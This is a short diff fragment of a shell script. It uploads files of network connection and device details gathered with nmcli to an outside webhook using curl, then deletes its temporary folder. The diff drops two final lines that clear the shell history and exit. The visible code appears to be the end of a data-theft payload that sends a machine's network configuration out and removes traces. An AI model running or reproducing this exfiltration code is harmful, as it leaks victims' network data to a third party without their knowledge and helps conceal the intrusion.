@@ -12,6 +12,3 @@ curl -F "file=@$TMP_FOLDER_PATH/nmcli_connection.txt" $WEBHOOK_URL
 curl -F "file=@$TMP_FOLDER_PATH/nmcli_device.txt" $WEBHOOK_URL
 
 rm -rf "$TMP_FOLDER_PATH"
-
-history -c
-exit
